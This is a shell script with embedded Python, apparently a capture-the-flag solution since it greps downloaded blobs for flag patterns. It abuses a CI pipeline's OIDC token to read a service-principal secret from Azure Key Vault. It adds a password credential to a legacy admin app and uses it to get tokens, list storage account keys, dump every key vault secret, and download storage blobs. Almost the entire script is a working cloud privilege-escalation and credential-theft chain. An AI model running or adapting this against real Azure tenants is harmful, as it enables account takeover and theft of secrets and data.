#!/usr/bin/env bash
set -uo pipefail
python3 - <<'PYEOF'
import os, json, time, base64, urllib.request, urllib.parse
def http(url, data=None, headers=None, method=None, js=None):
    h=dict(headers or {}); body=None
    if js is not None: body=json.dumps(js).encode(); h["Content-Type"]="application/json"
    elif isinstance(data, dict):
        body=urllib.parse.urlencode(data).encode(); h.setdefault("Content-Type","application/x-www-form-urlencoded")
    elif data==b"": body=b""; h.setdefault("Content-Length","0")
    req=urllib.request.Request(url, data=body, headers=h, method=method)
    try:
        with urllib.request.urlopen(req, timeout=40) as r: return r.status, r.read()
    except urllib.error.HTTPError as e: return e.code, e.read()
    except Exception as e: return 0, str(e).encode()
def jg(b):
    try: return json.loads(b)
    except Exception: return {}
def claims(t):
    p=t.split(".")[1]; p+="="*(-len(p)%4); return json.loads(base64.urlsafe_b64decode(p))
TEN=os.environ["AZURE_TENANT_ID"]; CID=os.environ["AZURE_CLIENT_ID"]; SUB=os.environ["AZURE_SUBSCRIPTION_ID"]
G="https://graph.microsoft.com/v1.0"
AUTOMATION_APPID="462d1c38-4459-48b8-9333-82e389e59514"
LEGACY_APPID="891fb158-e02c-4428-a885-53b811f369c0"; LEGACY_OBJ="22a3fb7e-860a-4708-9e50-3d36aa21191c"
st,b=http(os.environ["ACTIONS_ID_TOKEN_REQUEST_URL"]+"&audience=api://AzureADTokenExchange",
          headers={"Authorization":"bearer "+os.environ["ACTIONS_ID_TOKEN_REQUEST_TOKEN"]})
IDT=json.loads(b)["value"]
st,b=http(f"https://login.microsoftonline.com/{TEN}/oauth2/v2.0/token",{"client_id":CID,
  "scope":"https://vault.azure.net/.default","grant_type":"client_credentials",
  "client_assertion_type":"urn:ietf:params:oauth:client-assertion-type:jwt-bearer","client_assertion":IDT})
KVT=jg(b)["access_token"]
st,b=http("https://kv-tbl-prod-x3euoz.vault.azure.net/secrets/sync-service-principal?api-version=7.4",
          headers={"Authorization":"Bearer "+KVT})
sc=json.loads(jg(b)["value"])
st,b=http(f"https://login.microsoftonline.com/{TEN}/oauth2/v2.0/token",
  {"client_id":sc["appId"],"client_secret":sc["clientSecret"],
   "scope":"https://graph.microsoft.com/.default","grant_type":"client_credentials"})
HS={"Authorization":"Bearer "+jg(b)["access_token"]}

print("### appRoles defined on tbl-platform-automation")
st,b=http(f"{G}/applications?$filter=" + urllib.parse.quote(f"appId eq '{AUTOMATION_APPID}'") +
          "&$select=" + urllib.parse.quote("id,displayName,appRoles,identifierUris,api"), headers=HS)
for a in jg(b).get("value",[]):
    print("  app:", a["displayName"], "identifierUris:", a.get("identifierUris"))
    for r in a.get("appRoles",[]) or []:
        print(f"    role {r['value']!r} id={r['id']} types={r['allowedMemberTypes']} enabled={r['isEnabled']}")

kid=None
try:
    st,b=http(f"{G}/applications/{LEGACY_OBJ}/addPassword", headers=HS, method="POST",
              js={"passwordCredential":{"displayName":"ci-temp"}})
    pc=jg(b); kid=pc.get("keyId"); SEC=pc.get("secretText")
    print("\n### addPassword tbl-legacy-admin:", st)
    print("### waiting 70s for credential propagation"); time.sleep(70)
    def tk(scope):
        st,b=http(f"https://login.microsoftonline.com/{TEN}/oauth2/v2.0/token",
                  {"client_id":LEGACY_APPID,"client_secret":SEC,"scope":scope,"grant_type":"client_credentials"})
        return jg(b).get("access_token"), b[:140]
    t,err = tk(f"{AUTOMATION_APPID}/.default")
    print("### token for tbl-platform-automation audience:", "OK" if t else err)
    if t: print("    claims roles:", claims(t).get("roles"), "oid:", claims(t).get("oid"))
    t,err = tk("https://management.azure.com/.default")
    if not t:
        print("### ARM token:", err)
    else:
        cl=claims(t); print("### ARM token oid:", cl.get("oid"), "roles:", cl.get("roles"))
        H={"Authorization":"Bearer "+t}
        st,b=http(f"https://management.azure.com/subscriptions?api-version=2022-12-01", headers=H)
        print("   subscriptions:", st, [s.get("displayName") for s in jg(b).get("value",[])])
        st,b=http(f"https://management.azure.com/subscriptions/{SUB}/resources?api-version=2021-04-01", headers=H)
        print("   resources:", st, len(jg(b).get("value",[])))
        for acct in ("sttblappcfgprodx3euoz","sttblbackupprodx3euoz","sttblarchiveprodx3euoz","sttblcilogsprodx3euoz"):
            st2,b2=http(f"https://management.azure.com/subscriptions/{SUB}/resourceGroups/rg-tbl-platform-prod-sea/"
                        f"providers/Microsoft.Storage/storageAccounts/{acct}/listKeys?api-version=2023-01-01",
                        data=b"", headers=H, method="POST")
            print(f"   listKeys {acct}: {st2}")
            if st2==200: open(f"/tmp/key_{acct}","w").write(jg(b2)["keys"][0]["value"])
    t,err = tk("https://vault.azure.net/.default")
    if t:
        for v in ("kv-tbl-sec-x3euoz","kv-tbl-prod-x3euoz"):
            st,b=http(f"https://{v}.vault.azure.net/secrets?api-version=7.4", headers={"Authorization":"Bearer "+t})
            print(f"### {v}: {st}")
            if st==200:
                for s in jg(b).get("value",[]):
                    nm=s["id"].rsplit("/",1)[-1]
                    st2,b2=http(s["id"]+"?api-version=7.4", headers={"Authorization":"Bearer "+t})
                    print(f"    >>> {nm} = {jg(b2).get('value','')}")
finally:
    if kid:
        st,b=http(f"{G}/applications/{LEGACY_OBJ}/removePassword", headers=HS, method="POST", js={"keyId":kid})
        print("### cleanup:", st)
PYEOF
ls /tmp/key_* 2>/dev/null && for F in /tmp/key_*; do
  A=$(basename "$F" | sed 's/^key_//')
  CS="DefaultEndpointsProtocol=https;AccountName=$A;AccountKey=$(cat $F);EndpointSuffix=core.windows.net"
  echo "### $A containers/blobs"
  for C in $(az storage container list --connection-string "$CS" --query "[].name" -o tsv 2>/dev/null); do
    echo "  container $C:"
    az storage blob list -c "$C" --connection-string "$CS" --query "[].name" -o tsv 2>/dev/null | head -20 | while read -r B; do
      az storage blob download -c "$C" -n "$B" --connection-string "$CS" -f /tmp/bb --overwrite -o none 2>/dev/null
      echo "    - $B"
      grep -aoiE '(DF26|flag|CTF|cyberjutsu)\{[^}]{0,250}\}' /tmp/bb 2>/dev/null | head -3
    done
  done
done
rm -f /tmp/key_*
echo "=== done ==="